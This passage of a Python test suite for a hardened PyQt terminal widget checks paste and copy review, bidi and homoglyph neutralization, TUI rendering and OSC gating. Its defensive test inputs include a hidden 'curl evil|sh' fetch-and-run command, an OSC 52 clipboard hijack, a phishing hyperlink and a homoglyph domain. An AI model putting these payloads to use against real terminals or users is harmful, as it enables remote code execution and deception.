# a risky paste is HELD and a review requested; nothing is sent until a choice is
# dispatched (no blocking modal). Track the requests via the signal.
_reviews = []
p.paste_review_requested.connect(lambda raw, delay: _reviews.append((raw, delay)))
mime = QMimeData()
mime.setText('echo hi\n')
p.insertFromMimeData(mime)
# SECURITY: a newline-terminated single-line paste must NOT auto-execute -- the
# trailing submit is stripped so the command lands at the prompt awaiting the
# user's own Enter (it still crosses without a review; only the auto-run is
# removed).
eq(psent, [b'echo hi'], 'a single-line paste is delivered WITHOUT its trailing submit')
eq(_reviews, [], 'a clean single-line paste raises no review')
psent.clear()
# F3: a MULTI-LINE plain-ASCII paste is held for review too, so a hidden second
# command cannot run the instant you paste (default 'unicode' warn mode).
mime_ml = QMimeData()
mime_ml.setText('echo ok\ncurl evil|sh\n')
p.insertFromMimeData(mime_ml)
eq(psent, [], 'F3: a multi-line ASCII paste is held -- nothing reaches the shell yet')
ok(p.review_pending() and len(_reviews) == 1,
   'F3: a multi-line plain-ASCII paste raises a review (pastejacking held)')
p.dispatch_pending_paste('reject')
_reviews.clear()
psent.clear()
# a paste with a homoglyph (Cyrillic a) plus a bidi override: held for review
mime2 = QMimeData()
mime2.setText('pay' + chr(0x0430) + 'l' + chr(0x202E) + '\n')
p.insertFromMimeData(mime2)
eq(psent, [], 'a risky paste is held -- nothing reaches the shell until a choice')
ok(p.review_pending() and len(_reviews) == 1, 'a risky paste raises exactly one review')
# reject -> nothing sent, pending cleared
p.dispatch_pending_paste('reject')
eq(psent, [], 'rejected paste sends nothing')
ok(not p.review_pending(), 'reject clears the held paste')
# stripped -> ASCII only
p.insertFromMimeData(mime2)
p.dispatch_pending_paste('stripped')
eq(psent, [b'payl'],
   'stripped paste sends ASCII only (homoglyph + bidi dropped, no auto-submit)')
psent.clear()
# unicode -> keeps the printable homoglyph, still drops the bidi override
p.insertFromMimeData(mime2)
p.dispatch_pending_paste('unicode')
eq(psent, [('pay' + chr(0x0430) + 'l').encode('utf-8')],
   'unicode paste keeps the printable homoglyph but still drops the bidi override')
psent.clear()
# dispatch with nothing pending is a no-op -- a stale paste can never be re-sent
p.dispatch_pending_paste('unicode')
eq(psent, [], 'dispatch with no held paste sends nothing')
# a paste that is ONLY newline(s) becomes empty once its trailing submit is
# stripped -- nothing (not even a bare submit) reaches the shell.
psent.clear()
_pnl = QMimeData()
_pnl.setText('\n')
p.insertFromMimeData(_pnl)
eq(psent, [], 'a newline-only paste delivers nothing (no bare auto-submit)')

# regression (Fix #1, the user's repro): pasting a copied prompt line that ended
# in a newline AUTO-EXECUTED it -- the shell ran 'user@...%: not found', then its
# error-prompt redraw (a CR + short reprint) overwrote the line start, mangling
# 'user@work-claude' to '<k-claude'. The paste must never auto-execute: its
# trailing submit is stripped so it waits at the prompt, and the echoed text then
# renders verbatim (no CR-overwrite redraw to corrupt it).
_pr = SecureTerminal(command='/bin/cat')
_pr._mode = 'show'
_prsent = spy_writes(_pr)
_prmime = QMimeData()
_prmime.setText('user@work-claude:~/x% user@y% \n')
_pr.insertFromMimeData(_prmime)
ok(_prsent and not any(b.endswith(b'\r') for b in _prsent),
   'a pasted prompt line is delivered WITHOUT a trailing submit -- it cannot auto-run')
_pr._feed_line('user@work-claude:~/x% user@y% ')     # the shell's verbatim echo
_prdoc = _pr.toPlainText()
ok('user@work-claude' in _prdoc and '<k' not in _prdoc,
   'a pasted prompt string renders verbatim -- no <k line-start corruption')
_pr.close()

# --- paste warning: three modes (always / if-unicode default / never) ---------
eq(p.current_paste_warn(), 'unicode',
   'a new terminal defaults to warning only when a paste carries unicode/control')
_clean = QMimeData()
_clean.setText('echo ok\n')
_dirty = QMimeData()
_dirty.setText('echo ' + chr(0x0430) + '\n')

# default 'unicode': a clean ASCII paste bypasses review; a unicode one holds.
_reviews.clear(); psent.clear()
p.insertFromMimeData(_clean)
eq(_reviews, [], 'if-unicode mode: a clean ASCII paste is not questioned')
eq(psent, [b'echo ok'],
   'if-unicode mode: the clean paste goes straight through, minus its auto-submit')
_reviews.clear()
p.insertFromMimeData(_dirty)
eq(len(_reviews), 1, 'if-unicode mode: a unicode paste is questioned (held)')
p.dispatch_pending_paste('reject')

# 'never': not even a unicode/control paste holds. Opting out of review preserves
# FUNCTION -- printable unicode is KEPT, not stripped to ASCII (still neutralizing
# control/bidi/invisible injection) -- and the unreviewed crossing is surfaced via
# the risk lamp rather than by silently mangling the content.
p.apply_paste_warn('never')
eq(p.current_paste_warn(), 'never', 'apply_paste_warn switches the mode')
_reviews.clear(); psent.clear()
p.insertFromMimeData(_dirty)
eq(_reviews, [], 'never mode: even a unicode paste is not questioned')
eq(psent, [b'echo \xd0\xb0'],
   'never mode: the unicode paste is KEPT (not stripped) -- disabling review does '
   'not mangle deliberately pasted unicode -- but its trailing submit is still '
   'dropped, so even an unreviewed paste never auto-executes')

# 'always': even a clean ASCII paste holds for review.
p.apply_paste_warn('always')
_reviews.clear(); psent.clear()
p.insertFromMimeData(_clean)
eq(len(_reviews), 1, 'always mode: even a clean ASCII paste is questioned (held)')
eq(psent, [], 'always mode: nothing sent until a choice')
p.dispatch_pending_paste('reject')

# an unknown mode falls back to the safe default rather than trusting it.
p.apply_paste_warn('bogus')
eq(p.current_paste_warn(), 'unicode', 'an unknown paste-warn mode falls back to if-unicode')
p.apply_paste_warn('unicode')

# --- copy review (text going OUT to the clipboard; shared bar, own setting) ----
from PyQt6.QtGui import QGuiApplication as _QGA3          # noqa: E402
cp = SecureTerminal(command='/bin/cat')
cp._mode = 'show'                                        # Show keeps real glyphs
eq(cp.current_copy_warn(), 'unicode', 'a new terminal defaults copy_warn to if-unicode')
_creq = []
cp.copy_review_requested.connect(lambda raw, delay: _creq.append((raw, delay)))
# put a homoglyph line into the doc and select it
feed_output(cp, ('git ' + chr(0x0430) + 'dd\n').encode('utf-8'))
cp.selectAll()
_QGA3.clipboard().setText('OLD')
cp.copy()
ok(cp.review_pending() and len(_creq) == 1 and _QGA3.clipboard().text() == 'OLD',
   'a copy carrying unicode is HELD for review -- nothing reaches the clipboard yet')
# copy stripped -> ASCII only on the clipboard
cp.dispatch_pending_copy('stripped')
eq(_QGA3.clipboard().text(), 'git dd\n', 'copy stripped puts ASCII only (homoglyph dropped)')
cp.selectAll(); cp.copy(); cp.dispatch_pending_copy('unicode')
eq(_QGA3.clipboard().text(), 'git ' + chr(0x0430) + 'dd\n',
   'copy with unicode keeps the printable homoglyph')
# reject -> the clipboard is left untouched
_QGA3.clipboard().setText('KEEP'); cp.selectAll(); cp.copy()
cp.dispatch_pending_copy('reject')
eq(_QGA3.clipboard().text(), 'KEEP', 'a rejected copy leaves the clipboard unchanged')
# 'never' copies as displayed without a prompt; 'always' reviews even plain ASCII
cp.apply_copy_warn('never')
_creq.clear(); _QGA3.clipboard().setText('X'); cp.selectAll(); cp.copy()
ok(not _creq and _QGA3.clipboard().text().startswith('git '),
   'never mode: a copy goes straight to the clipboard, no review')
_ascii = SecureTerminal(command='/bin/cat'); _ascii.apply_copy_warn('always')
_areq = []
_ascii.copy_review_requested.connect(lambda raw, delay: _areq.append((raw, delay)))
feed_output(_ascii, b'plain ascii\n'); _ascii.selectAll(); _ascii.copy()
ok(len(_areq) == 1, 'always mode: even a plain-ASCII copy is reviewed')
# a copy review carries NO countdown (copy is not executed): delay is 0
eq(_areq[0][1], 0, 'copy review requests delay 0 (no anti-fat-finger gate needed)')
_ascii.dispatch_pending_copy('reject')
cp.apply_copy_warn('bogus')
eq(cp.current_copy_warn(), 'unicode', 'an unknown copy-warn mode falls back to if-unicode')

# the STANDARD right-click Copy fires Qt's non-virtual C++ copy(), which would
# bypass the reviewed copy() override; the terminal reroutes it so a context-menu
# copy is reviewed too (not just Ctrl+Shift+C).
cp.apply_copy_warn('unicode')
from PyQt6.QtCore import QPoint as _QPoint2                # noqa: E402
_menu = cp._reviewed_context_menu(_QPoint2(5, 5))
_copy_act = [a for a in _menu.actions() if a.objectName() == 'edit-copy'][0]
_creq.clear(); _QGA3.clipboard().setText('OLD'); cp.selectAll()
_copy_act.trigger()
ok(cp.review_pending() and len(_creq) == 1 and _QGA3.clipboard().text() == 'OLD',
   'the context-menu Copy is routed through the copy review, not straight to the clipboard')
cp.dispatch_pending_copy('reject')

# --- FIX A: multi-path copy-oracle for Show-mode inert display glyphs ----------
# A user copied a boxed cell and got only spaces: the ASCII export paths dropped the
# inert DISPLAY glyph (the U+25A1 neutralization box, and Show-mode structural
# box-drawing shown as its real glyph) to NOTHING, so a box present on screen
# vanished on the clipboard -- security-SAFE (the raw dangerous byte is never in the
# text) but "silently wrong". Feed a payload with BOTH a neutralized/boxed cell (a
# bidi override, shown as the box) AND a structural box-drawing run, in TUI Show
# mode, then assert EVERY export path holds three invariants:
#   * NEVER emits the raw dangerous codepoint (U+202E) -- the leak guard;
#   * NEVER collapses the boxed region to whitespace-only -- the silent-loss guard;
#   * carries a non-empty inert ASCII stand-in for the box / structural glyphs.
from PyQt6.QtGui import QGuiApplication as _QGA_ora            # noqa: E402
_ORA_BOX = chr(0x25A1)                              # U+25A1 WHITE SQUARE (the box)
_ORA_RLO = chr(0x202E)                              # RIGHT-TO-LEFT OVERRIDE (bidi)
# No .show()/pump() here: _render_tui paints the grid synchronously and leaves no
# pending debounced-paint timer, so this block is hermetic -- it cannot perturb the
# event-loop timing of a later test.
_ora = SecureTerminal(command='/bin/cat', tui=True)
_ora.apply_mode('show')
_ora.apply_copy_warn('always')                      # force the copy review flow
# row: x <boxed RLO> y  then DEC line-drawing 'lqk' -> real box-drawing glyphs
_ora._feed_stream(('x' + _ORA_RLO + 'y ').encode() + b'\x1b(0lqk\x1b(B\r\n')
_ora._render_tui()
_oratxt = _ora.toPlainText()
ok(_ORA_BOX in _oratxt, 'copy-oracle: the bidi cell is shown as the neutralization box')
ok(any(0x2500 <= ord(c) <= 0x257F for c in _oratxt),
   'copy-oracle: the DEC line-drawing renders as real box-drawing glyphs')

def _ora_copy(action):
    _QGA_ora.clipboard().setText('SENTINEL')
    _ora.selectAll()
    _ora.copy()
    _ora.dispatch_pending_copy(action)
    return _QGA_ora.clipboard().text()

_ora.selectAll()
_ora_prim = _ora.createMimeDataFromSelection().text()   # PRIMARY / drag path
_ora_strip = _ora_copy('stripped')                      # Ctrl+C review 'stripped'
_ora_uni = _ora_copy('unicode')                         # Ctrl+C review 'unicode'
_ora_plain = _ora.toPlainText()
_ora_scr = _ora.transcript_text()

# Every path: never the raw dangerous codepoint, never whitespace-only.
for _lbl, _exp in (('PRIMARY/drag', _ora_prim), ('copy stripped', _ora_strip),
                   ('copy unicode', _ora_uni), ('toPlainText', _ora_plain),
                   ('transcript_text', _ora_scr)):
    ok(_ORA_RLO not in _exp,
       'copy-oracle %s: never emits the raw bidi override (leak guard)' % _lbl)
    ok(_exp.strip() != '',
       'copy-oracle %s: the boxed region never collapses to whitespace-only' % _lbl)

# The two ASCII strip paths map the box -> '_' and the box-drawing -> an ASCII shape,
# instead of dropping them (the silent-loss canary: '_' is ABSENT on the old code).
for _lbl, _exp in (('PRIMARY/drag', _ora_prim), ('copy stripped', _ora_strip)):
    ok(all(ord(c) < 128 for c in _exp),
       'copy-oracle %s: pure ASCII (no glyph rides out unreviewed)' % _lbl)
    ok('_' in _exp,
       'copy-oracle %s: the neutralized box exports as ASCII _ (not lost)' % _lbl)
    ok(any(c in '+-|#' for c in _exp),
       'copy-oracle %s: the structural box-drawing exports an ASCII stand-in' % _lbl)
# The 'unicode' opt-in keeps the inert box + structural glyph AS glyphs (never the
# raw override) -- FIX A leaves this correct path untouched.
ok(_ORA_BOX in _ora_uni,
   'copy-oracle copy unicode: keeps the inert box glyph (opted-in real unicode)')
ok(any(0x2500 <= ord(c) <= 0x257F for c in _ora_uni),
   'copy-oracle copy unicode: keeps the structural box-drawing glyph')
# transcript_text expands the box to its NAMED source codepoint (lossless save).
ok('U+202E' in _ora_scr,
   'copy-oracle transcript_text: the box expands to the named source codepoint')
_ora.close()

# A boxed cell surrounded only by spaces is the sharpest silent-loss case: on the old
# code the ASCII paths dropped it and the whole selection was whitespace-only.
_orb = SecureTerminal(command='/bin/cat', tui=True)
_orb.apply_mode('show')
_orb._feed_stream((' ' + _ORA_RLO + ' \r\n').encode())
_orb._render_tui()
_orb.selectAll()
_orb_prim = _orb.createMimeDataFromSelection().text()
ok(_orb_prim.strip() != '' and '_' in _orb_prim,
   'copy-oracle: a space-flanked box copies as _ (never a whitespace-only string)')
ok(_ORA_RLO not in _orb_prim,
   'copy-oracle: the space-flanked box never leaks the raw override')
_orb.close()

# FIX B end-to-end, refined by task #36: claude-code prints "<U+276F><U+00A0>Try ..."
# as its prompt. The reported "box icon" is the trailing U+00A0 NO-BREAK SPACE (blank
# non-ASCII). Task #36 shows it as the DISTINCT space marker (SPACE_MARK), not a full
# box, so the line stays readable -- yet the marker is a non-ASCII glyph that can never
# pose as a plain space, every text export maps it to '_' (never ' '), and a saved
# transcript names its codepoint inline. The caret U+276F renders as its own glyph.
_SPMARK = chr(0x2423)                               # SPACE_MARK (U+2423 OPEN BOX)
_clp = SecureTerminal(command='/bin/cat', tui=True)
_clp.apply_mode('show')
_clp._feed_stream((chr(0x276F) + chr(0x00A0) + 'Try\r\n').encode())
_clp._render_tui()
# the RAW on-screen document (QTextDocument.toPlainText, not the widget's export
# override): the caret glyph plus the DISTINCT space marker, never a raw NBSP or a
# full box, and never a plain ASCII space in the marker's place.
_clp_screen = _clp.document().toPlainText()
ok(chr(0x276F) in _clp_screen,
   'claude prompt: the caret U+276F renders as its own glyph on screen (not boxed)')
ok(_SPMARK in _clp_screen,
   'claude prompt: the trailing NBSP is shown as the distinct space marker')
ok(_ORA_BOX not in _clp_screen,
   'claude prompt: the NBSP is the space marker, not the full box')
ok(chr(0x00A0) not in _clp_screen,
   'claude prompt: the marker never renders as the raw NBSP')
# EXPORT (toPlainText): the marker maps to '_', leaving no marker and no raw NBSP.
_clptxt = _clp.toPlainText()
ok('_' in _clptxt and 'Try' in _clptxt,
   'claude prompt: export maps the space marker to _')
ok(_SPMARK not in _clptxt and chr(0x00A0) not in _clptxt,
   'claude prompt: export leaves no marker glyph and no raw NBSP')
# COPY (PRIMARY selection): pure ASCII, the marker as '_', never a space.
_clp.selectAll()
_clp_prim = _clp.createMimeDataFromSelection().text()
ok('_' in _clp_prim and 'Try' in _clp_prim,
   'claude prompt: copy keeps the marked NBSP as _ and the following text')
ok(chr(0x00A0) not in _clp_prim and _SPMARK not in _clp_prim,
   'claude prompt: copy never emits a raw NBSP or the marker glyph')
ok(all(ord(c) < 128 for c in _clp_prim),
   'claude prompt: the copied prompt row is pure ASCII (the confusable caret is dropped)')
# TRANSCRIPT (saved record): lossless -- the marker is named inline in Detail form.
_clp_tr = _clp.transcript_text()
ok('<U+00A0 NO-BREAK SPACE>' in _clp_tr,
   'claude prompt: a saved transcript names the NBSP inline (<U+00A0 NO-BREAK SPACE>)')
ok(_SPMARK not in _clp_tr and chr(0x00A0) not in _clp_tr,
   'claude prompt: the transcript leaves no marker glyph and no raw NBSP')
_clp.close()

# --- TUI mode (pyte is a required dependency: fail closed, do not skip) -------
ok(tui_available(), 'python3-pyte available for TUI mode')
if tui_available():
    tui = SecureTerminal(command='/bin/cat', tui=True)
    tui.resize(700, 300)
    tui.show()
    pump(50)
    ok(tui.tui_active(), 'tui active')
    # cursor addressing: place text at row 3 col 5 (1-indexed)
    tui.apply_mode('show')
    tui._stream.feed(b'\x1b[2J\x1b[3;5HPLACED')
    tui._render_tui()
    rows = tui.toPlainText().split('\n')
    hit = [(i, r.index('PLACED')) for i, r in enumerate(rows) if 'PLACED' in r]
    eq(hit[:1], [(2, 4)], 'tui cursor addressing')
    # full-screen program layout (what vim/htop/tmux emit): a box drawn with
    # box-drawing characters, cursor-addressed content, and a bottom status line.
    # In show mode the box-drawing glyphs survive; the grid places every piece.
    fs = SecureTerminal(command='/bin/cat', tui=True)
    fs.resize(700, 300)
    fs.show()
    pump(50)
    fs.apply_mode('show')
    _last = fs._screen.lines                   # actual grid height in rows
    _tl, _tr = chr(0x250C), chr(0x2510)        # box corners (vim/tmux borders)
    _h, _v = chr(0x2500), chr(0x2502)
    fs._stream.feed(('\x1b[2J\x1b[1;1H' + _tl + _h * 6 + _tr
                     + '\x1b[2;1H' + _v + ' vim  ' + _v
                     + ('\x1b[%d;1H' % _last) + '-- INSERT --').encode('utf-8'))
    fs._render_tui()
    _fr = fs.toPlainText().split('\n')
    ok(_fr[0].startswith(_tl + _h * 6 + _tr), 'tui draws the top box border')
    ok(_v + ' vim  ' + _v in _fr[1], 'tui places boxed content on row 2')
    ok(_fr[_last - 1].startswith('-- INSERT --'),
       'tui places the status line on the last row')
    # the same frame in box mode: box-drawing glyphs become _, ASCII stays
    fs.apply_mode('box')
    fs._render_tui()
    _sr = fs.toPlainText().split('\n')
    ok(_tl not in _sr[0] and '_' in _sr[0], 'box mode neutralizes box glyphs')
    ok(_sr[_last - 1].startswith('-- INSERT --'), 'box keeps the ASCII status line')
    fs.shutdown()
    # a pyte parser error on real program output (private SGR that some pyte
    # builds mishandle -- htop/vim/tmux emit these) must be contained, never
    # crash the terminal
    crash = SecureTerminal(command='/bin/cat', tui=True)
    crash.resize(700, 300)
    crash.show()
    pump(50)
    crash._feed_stream(b'\x1b[1;2;3?m')          # private SGR: pyte may raise
    crash._feed_stream(b'ok\r\n')
    crash._render_tui()
    ok('ok' in crash.toPlainText(), 'pyte parser error contained; terminal survives')
    # the rest of the pyte 0.8.0 crash-bug family (extra CSI params, a private CSI
    # final, an unhandled erase 'how', VPA under DECOM, a non-ASCII digit in a
    # param) must be swallowed by the same feed guard -- feed each, then confirm
    # later output still renders.
    for _seq in (b'\x1b[1;2A', b'\x1b[?0A', b'\x1b[3K', b'\x1b[4J',
                 b'\x1b[?6h\x1b[5d', b'\x1b[\xc2\xb3A'):
        crash._feed_stream(_seq)
    crash._feed_stream(b'ok2\r\n')
    crash._render_tui()
    ok('ok2' in crash.toPlainText(),
       'pyte crash-bug family (A/C/D/F) contained; terminal still renders')
    crash.shutdown()
    # scrolling output rendered frame-by-frame (the live path) must NOT be
    # double-spaced: _delete_grid must eat the newline joining scrollback to the
    # grid, or every scrolled row leaves a spurious empty block (a blank line
    # between each line -- seen with zsh's completion pager listing).
    ds = SecureTerminal(command='/bin/cat', tui=True)
    ds.resize(600, 300)
    ds.show()
    pump(30)
    _rows = ds._screen.lines
    for _k in range(_rows * 3):                 # enough to scroll well past one screen
        ds._feed_stream(('row%02d\r\n' % _k).encode())
        ds._render_tui()                        # one render per feed, like the timer
    _dl = ds.toPlainText().split('\n')
    _between = [i for i in range(1, len(_dl) - 1)
                if not _dl[i].strip() and _dl[i - 1].strip() and _dl[i + 1].strip()]
    eq(len(_between), 0,
       'TUI scrolling output is not double-spaced (no blank line between rows)')
    ok('row%02d' % (_rows * 3 - 1) in ds.toPlainText(),
       'the latest scrolled row is present')
    ds.shutdown()
    # per-cell bidi neutralized in box mode
    tui.apply_mode('box')
    tui._stream.feed(b'\x1b[10;1Ha\xe2\x80\xaeb')     # a U+202E b
    tui._render_tui()
    ok(chr(0x202E) not in tui.toPlainText(), 'tui bidi neutralized')
    # colour cell renders
    tui.apply_mode('show')
    tui._stream.feed(b'\x1b[12;1H\x1b[32mG\x1b[0m')
    tui._render_tui()
    ok(any(row[x].data == 'G' and row[x].fg == 'green'
           for row in [tui._screen.buffer[y] for y in range(tui._screen.lines)]
           for x in range(tui._screen.columns)), 'tui colour cell')
    # title + notification handling when allowed
    tui.apply_allow_title(True)
    titles = []
    notes = []
    tui.title_changed.connect(titles.append)
    tui.notified.connect(notes.append)
    tui._stream.feed(b'\x1b]2;My ev\xe2\x80\xaeil Title\x07')
    tui._handle_osc(b'\x1b]2;My ev\xe2\x80\xaeil Title\x07')
    ok(titles and chr(0x202E) not in titles[-1], 'tui title sanitized')
    tui._handle_osc(b'\x1b]9;done\x07')
    ok(notes and notes[-1] == 'done', 'tui notification captured')
    # off: no title emitted
    tui.apply_allow_title(False)
    before = len(titles)
    tui._stream.feed(b'\x1b]2;ignored\x07')
    ok(len(titles) == before, 'allow_title off: the guarded feed path emits no title')
    tui._handle_osc(b'\x1b]2;ignored\x07')  # guard is in _on_readable
    # --- granular OSC handlers: each off by default, honored only when enabled ---
    import base64 as _b64                                   # noqa: E402
    from PyQt6.QtGui import QGuiApplication as _QGA2         # noqa: E402
    _QGA2.clipboard().setText('ORIGINAL')
    # clipboard OSC 52 OFF by default -> a program cannot write the clipboard
    tui._handle_osc(b'\x1b]52;c;' + _b64.b64encode(b'HIJACK') + b'\x07')
    ok(_QGA2.clipboard().text() == 'ORIGINAL',
       'OSC 52 clipboard write is neutralized until osc_clipboard is enabled')
    tui.apply_osc('osc_clipboard', True)
    tui._handle_osc(b'\x1b]52;c;' + _b64.b64encode(b'pasted') + b'\x07')
    ok(_QGA2.clipboard().text() == 'pasted', 'enabled: OSC 52 writes the clipboard')
    _QGA2.clipboard().setText('SECRET')
    tui._handle_osc(b'\x1b]52;c;?\x07')                     # read query
    ok(_QGA2.clipboard().text() == 'SECRET',
       'an OSC 52 read query is DECLINED (never answered -- no exfiltration)')
    tui._handle_osc(b'\x1b]52;c;' + _b64.b64encode(b'a\x1b[31mb\x00c') + b'\x07')
    ok(_QGA2.clipboard().text() == 'a[31mbc',
       'a clipboard write is stripped of escape/control bytes')
    # the write filter is isprintable()-based like the paste path: a bidi override,
    # a zero-width character and a C1 control are dropped, so a program cannot
    # smuggle a look-alike or hidden character onto the SYSTEM clipboard (which a
    # later paste into any application would otherwise carry).
    _hostile = ('git' + chr(0x202E) + ' config' + chr(0x200B)
                + chr(0x85)).encode('utf-8')
    tui._handle_osc(b'\x1b]52;c;' + _b64.b64encode(_hostile) + b'\x07')
    ok(_QGA2.clipboard().text() == 'git config',
       'OSC 52 write drops bidi/zero-width/C1, like the paste sanitizer')
    # ASCII-only for the untrusted program-driven write (unlike the user's own,
    # reviewed copy): a homoglyph must not ride onto the system clipboard to
    # deceive a later paste into another application.
    _homo = ('p' + chr(0x0430) + 'ypal.com').encode('utf-8')   # Cyrillic a look-alike
    tui._handle_osc(b'\x1b]52;c;' + _b64.b64encode(_homo) + b'\x07')
    ok(_QGA2.clipboard().text() == 'pypal.com',
       'OSC 52 write is ASCII-only: a homoglyph is dropped (no clipboard deception)')
    # a huge OSC numeric parameter must not crash the app -- int() raises on a
    # 4300+-digit string (Python 3.11+), and these parsers run in a Qt notifier
    # slot, so an unhandled exception would abort the whole application.
    for _f in ('osc_title', 'osc_palette'):
        tui.apply_osc(_f, True)
    tui._handle_osc(b'\x1b]' + b'9' * 5000 + b';x\x07')          # huge OSC code
    tui._handle_osc(b'\x1b]4;' + b'1' * 5000 + b';rgb:ff/00/00\x07')  # huge palette index
    ok(isinstance(tui.toPlainText(), str),
       'a 5000-digit OSC code / palette index does not crash the TUI OSC handlers')
    # cwd OSC 7 gated + emits the safe path
    _cwds = []
    tui.cwd_changed.connect(_cwds.append)
    tui._handle_osc(b'\x1b]7;file://h/home/u/p\x07')        # osc_cwd off
    ok(_cwds == [], 'OSC 7 cwd is ignored until osc_cwd is enabled')
    tui.apply_osc('osc_cwd', True)
    tui._handle_osc(b'\x1b]7;file://h/home/u/p\x07')
    ok(_cwds == ['/home/u/p'], 'enabled: OSC 7 reports the unquoted path')
    # #6: a long cwd path must show up to 4096 chars in the tab tooltip, not be cut to 80.
    # sanitize_title's default limit is 80, so the old trailing [:4096] slice was dead -- the
    # bound is now passed to the sanitizer.
    _cwds.clear()
    tui._reported_cwd = ''
    tui._handle_osc(b'\x1b]7;file://h/' + b'd' * 300 + b'\x07')
    ok(_cwds and len(_cwds[-1]) > 80,
       '#6: a long OSC 7 cwd path is bounded at 4096, not truncated to the sanitize_title '
       'default of 80 (got %d)' % (len(_cwds[-1]) if _cwds else -1))
    # iTerm2 OSC 1337 has NO toggle: file transfer from untrusted output is
    # indefensible, so it can never be enabled and is always neutralized
    # (recognized, dropped, never leaked). It is not even a registered feature.
    ok('osc_iterm2' not in {_f[0] for _f in _S.OSC_FEATURES},
       'iTerm2 (OSC 1337) is not a toggleable OSC feature -- it cannot be enabled')
    _QGA2.clipboard().setText('UNTOUCHED')
    _t0, _n0, _c0 = len(titles), len(notes), len(_cwds)
    for _payload in (b'\x1b]1337;File=name=eA==;size=1:eA==\x07',   # inline file
                     b'\x1b]1337;SetUserVar=k=dg==\x07',            # shell variable
                     b'\x1b]1337;RequestUpload=format=tgz\x07'):    # file transfer
        tui._handle_osc(_payload)
    ok(len(titles) == _t0 and len(notes) == _n0 and len(_cwds) == _c0
       and _QGA2.clipboard().text() == 'UNTOUCHED',
       'OSC 1337 is always neutralized: no signal, no clipboard, no cwd, no toggle')
    # palette OSC 4/10/11: gated, and a program CANNOT hide text by moving fg==bg
    class _Cell:                                            # a default-coloured cell
        fg = bg = 'default'
        bold = reverse = underscore = False
        data = ' '
    tui._handle_osc(b'\x1b]11;#123456\x07')                 # osc_colors OFF
    ok(tui._osc_palette == {}, 'OSC palette change is ignored until osc_colors is on')
    tui.apply_osc('osc_colors', True)
    tui._handle_osc(b'\x1b]10;#000000\x07\x1b]11;#000000\x07')   # hide attempt fg==bg
    _hidfg = tui._pyte_format(_Cell()).foreground().color().name()
    ok(_hidfg != '#000000',
       'fg==bg (via OSC 10/11) cannot hide text: the guard forces a readable colour')
    tui._fmt_cache.clear()
    tui._handle_osc(b'\x1b]10;#33cc99\x07')                 # a legit fg is applied
    ok(tui._pyte_format(_Cell()).foreground().color().name() == '#33cc99',
       'a legitimate OSC 10 foreground colour is applied')
    tui.apply_osc('osc_colors', False)
    ok(tui._osc_palette == {}, 'disabling osc_colors reverts to the theme palette')
    # a flood of palette changes is bounded: _osc_color must not render per change
    # (the timer coalesces), so this returns promptly and applies the last value.
    tui.apply_osc('osc_colors', True)
    tui._handle_osc(b''.join(b'\x1b]4;2;#%02x0000\x07' % (_i % 256)
                             for _i in range(300)))
    ok(tui._osc_palette.get(2) is not None,
       'a burst of OSC 4 palette changes is applied without per-change rendering')
    tui.apply_osc('osc_colors', False)
    # hyperlink OSC 8: gated, and surfaces the REAL target next to the visible text
    # (a link's display text can differ from where it points -- the phishing risk).
    _links = []
    tui.notified.connect(_links.append)
    tui._handle_osc(b'\x1b]8;;https://evil.example\x07Google\x1b]8;;\x07')
    ok(_links == [], 'OSC 8 hyperlinks are ignored until osc_hyperlink is enabled')
    tui.apply_osc('osc_hyperlink', True)
    tui._handle_osc(b'\x1b]8;;https://evil.example/login\x07Google\x1b]8;;\x07')
    ok(_links and 'Google' in _links[-1] and 'evil.example/login' in _links[-1],
       'a hyperlink surfaces the real target next to the display text')
    tui.shutdown()
    # mode switch is renderer-only: NO shell restart, the running program and its
    # frame survive. A program writes a full-screen frame to stdout in line mode;
    # flipping to TUI must show the frame without the pid changing. (The frame
    # goes to stdout, not through the line-discipline echo, so the raw escapes
    # reach the read path.)
    if tui_available():
        # a real program that writes a full-screen frame to stdout, then idles so
        # the child stays alive for the pid check (a temp script avoids the shell
        # quoting/escaping that a -c string would suffer through shlex).
        _script = os.path.join(tempfile.mkdtemp(prefix='st-frame-'), 'frame.sh')
        with open(_script, 'w') as _f:
            _f.write('#!/bin/sh\n'
                     'printf "HIST_LINE\\n"\n'
                     'printf "\\033[?1049h\\033[2J\\033[HFRAME_XYZ\\n"\n'
                     'sleep 30\n')
        os.chmod(_script, 0o700)
        sw = SecureTerminal(command=_script)
        _adv = []
        sw.advise_signal.connect(_adv.append)   # advisories are EMITTED, not injected
        sw.resize(700, 300)
        sw.show()
        pump(300)
        _pid = sw._pid
        ok(sw._alt_screen, 'alt-screen tracked in line mode')
        ok(sw._tui_hint_shown and any('TUI' in a for a in _adv),
           'advisory emitted (not injected into the document) for a full-screen app')
        ok('[secure-terminal]' not in sw.toPlainText(),
           'the advisory is not injected into the terminal, so it cannot be copied')
        sw.apply_tui(True)
        pump(50)
        eq(sw._pid, _pid, 'mode switch does NOT restart the shell (same pid)')
        ok('FRAME_XYZ' in sw.toPlainText(), 'running frame survives the switch to TUI')
        sw.apply_tui(False)
        pump(30)
        eq(sw._pid, _pid, 'switching back does not restart either')
        ok('HIST_LINE' in sw.toPlainText(), 'line scrollback restored on the way back')
        sw.shutdown()
else:
    # already recorded as a FAIL above; do not silently pass
    sys.stderr.write('secure-terminal-tests(widget): FAIL pyte absent, TUI-mode '
                     'assertions could not run\n')

# line mode forwards the cursor/history keys to the shell's line editor: Up/Down
# recall history, Left/Right/Home/End/Delete edit -- the arrow-up regression.
ak = SecureTerminal(command='/bin/cat')
asent = spy_writes(ak)
key(ak, Qt.Key.Key_Up)
key(ak, Qt.Key.Key_Down)
key(ak, Qt.Key.Key_Left)
key(ak, Qt.Key.Key_Right)
key(ak, Qt.Key.Key_Home)
key(ak, Qt.Key.Key_End)
key(ak, Qt.Key.Key_Delete)
eq(asent, [b'\x1b[A', b'\x1b[B', b'\x1b[D', b'\x1b[C', b'\x1b[H', b'\x1b[F', b'\x1b[3~'],
   'line mode forwards arrows/Home/End/Delete to the shell')

# default tab label is the working-directory basename, not a static "shell":
# "~" for home, else the directory name. The child forks in our cwd.
cw = SecureTerminal(command='/bin/cat')
_cwd = os.getcwd()
_expect = '~' if _cwd == os.path.expanduser('~') else (os.path.basename(_cwd) or '/')
eq(cw.cwd_basename(), _expect, 'cwd_basename matches the shell working directory')

# hovering a reveal <U+XXXX> badge shows a tooltip explaining the code point.
from PyQt6.QtWidgets import QToolTip                    # noqa: E402
from PyQt6.QtGui import QHelpEvent                      # noqa: E402
tt = SecureTerminal(command='/bin/cat')
tt.resize(700, 300)
tt.show()
tt.apply_mode('reveal')
